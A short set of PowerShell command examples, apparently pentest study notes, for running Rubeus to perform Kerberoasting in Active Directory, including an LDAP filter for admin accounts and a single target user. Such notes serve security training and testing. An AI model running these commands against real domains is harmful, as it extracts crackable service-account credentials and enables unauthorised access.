```powershell-session
.\Rubeus.exe
```


```powershell-session
.\Rubeus.exe kerberoast /stats
```


#### Using the /nowrap Flag
```powershell-session
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

#### Target user
```powershell-session
.\Rubeus.exe kerberoast /user:testspn /nowrap
```
